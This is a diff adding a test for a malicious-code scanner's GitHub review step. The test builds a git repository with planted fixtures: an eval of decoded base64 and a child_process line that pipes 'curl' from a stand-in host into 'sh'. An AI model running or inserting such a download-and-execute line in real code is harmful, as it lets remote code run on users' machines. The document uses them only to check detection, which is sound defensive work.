@@ -271,6 +271,26 @@ test("diff mode reads only changed files; gitignored output is skipped", async (
   assert.deepEqual(diff.findings.filter(f => f.rule === "mal-eval-decoded").map(f => f.file), ["new.js"]);
 });
 
+test("GitHub review: changed lines block, findings already in the file are only listed", () => {
+  const dir = project({ "app.js": j("const a = 1;\neval(at", "ob(old));\n"), "README.md": "hi\n" });
+  const git = (...a) => spawnSync("git", a, { cwd: dir, encoding: "utf8" });
+  const commit = m => { git("add", "."); git("-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", m); };
+  git("init", "-q"); commit("base");
+  const base = git("rev-parse", "HEAD").stdout.trim();
+  fs.appendFileSync(path.join(dir, "app.js"), j("require('child_process').exec('cu", "rl -s https://x.example/p.sh | sh');\n"));
+  commit("pull request");
+  const report = path.join(dir, "..", `${path.basename(dir)}-report.json`), summary = path.join(dir, "..", `${path.basename(dir)}-summary.md`);
+  spawnSync(process.execPath, [path.resolve("skills/vetcode/scripts/vet.mjs"), ".", "--diff", base, "--json", report, "--quiet", "--no-tools"], { cwd: dir });
+  const env = { ...process.env, GITHUB_STEP_SUMMARY: summary, GITHUB_EVENT_PATH: "", GITHUB_TOKEN: "" };
+  const r = spawnSync(process.execPath, [path.resolve("action/review.mjs"), report, "--base", base, "--fail-on", "high"], { cwd: dir, env, encoding: "utf8" });
+  const md = fs.readFileSync(summary, "utf8");
+  assert.equal(r.status, 1, r.stderr);
+  assert.match(md, /On changed lines[\s\S]*app\.js:3[\s\S]*mal-download-exec/);
+  assert.match(md, /Not on a changed line[\s\S]*mal-eval-decoded/);
+  const quiet = spawnSync(process.execPath, [path.resolve("action/review.mjs"), report, "--base", base, "--fail-on", "critical"], { cwd: dir, env, encoding: "utf8" });
+  assert.equal(quiet.status, 0, "the only critical finding was already in the file");
+});
+
 test("CLI prints a report and --fail-on sets the exit code", () => {
   const dir = project({ "a.js": j("eval(at", "ob(x));\n") });
   const cli = path.resolve("skills/vetcode/scripts/vet.mjs");
